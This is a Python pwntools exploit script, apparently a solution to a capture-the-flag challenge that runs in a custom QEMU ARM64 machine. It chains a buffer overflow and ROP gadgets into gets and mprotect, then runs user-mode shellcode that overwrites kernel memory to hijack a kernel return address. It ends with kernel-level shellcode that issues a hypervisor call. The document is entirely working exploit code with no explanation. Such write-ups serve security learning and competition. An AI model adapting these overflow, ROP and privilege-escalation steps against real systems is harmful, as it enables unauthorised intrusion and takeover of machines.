from pwn import *
context(arch='aarch64',endian='little')
  
cmd  = "cd ../../../run ;"
cmd += "./qemu-system-aarch64 -nographic -machine hitcon -cpu hitcon "
cmd += "-bios ./bios.bin -monitor /dev/null 2>/dev/null -serial null "
cmd += "-S -s"

io = process(["/bin/sh","-c",cmd])

mprotect = 0x401B68
gets     = 0x4019B0
sc_addr  = 0x7ffeffffd008

el0_shellcode = asm('''   
    // print el0 flag
    ldr x0, =0x400104 
    blr x0
    
    // a = mmap(0,0x1000,0x3) 
    mov x0, 0x0 
    mov x1, 0x1000
    mov x2, 0x2
    mov x8, 0xde
    svc 0
    
    mov  x15, x0
    
    // gets(a)
    ldr x3, =0x4019B0
    blr x3
    
    // mprotect(a,0x1000,0x5)
    mov  x0, x15
    mov  x1, 0x1000
    mov  x2, 0x5
    mov  x8, 0xe2
    svc  0
    
    // read input to 0xffffffffc001e001
    ldr x1,=0xffffffffc001e001
    mov x2, 1
    mov x8, 0x3f
    svc 0
    
    // read input to 0xffffffffc001e002
    add x1, x1, 1
    mov x2, 1
    mov x8, 0x3f
    svc 0
    
    // hijack kernel return address to 0xffffffffc0000030
    ldr x1,=0xffffffffc0019bb9
    mov x2, 1
    mov x8, 0x3f
    svc 0 
''')

el1_shellcode = asm('''
    mov x0, 1
    mov x1, 0x2080
    mov x2, 0x100000
    hvc 0
    nop
''')

assert( b"\x0a" not in el0_shellcode)
assert( b"\x0b" not in el0_shellcode)

assert( b"\x0a" not in el1_shellcode)
assert( b"\x0b" not in el1_shellcode)

io.sendlineafter(b"cmd> ",b"0")
io.sendlineafter(b"index: ",b'a'*0xf8+p64(sc_addr)+p64(gets)+p64(mprotect))
io.sendline(b'a'*8+el0_shellcode)

io.sendlineafter(b"cmd> ",b"1")
io.sendlineafter(b"index: ",b'4096')
io.sendlineafter(b"key: ",b'12345')

io.sendlineafter(b"cmd> ",b"-1")
io.sendlineafter(b"index: ",b'1')

# write el1_shellcode to 0x7ffeffffc030
io.sendline(b'a'*0x30+el1_shellcode)

# write 0x54 to 0xffffffffc001e001
# write 0x03 to 0xffffffffc001e002
io.send(b'\x54\x03')   

# write 0x00 to 0xffffffffc0019bb9
io.send(b'\x00')
io.interactive()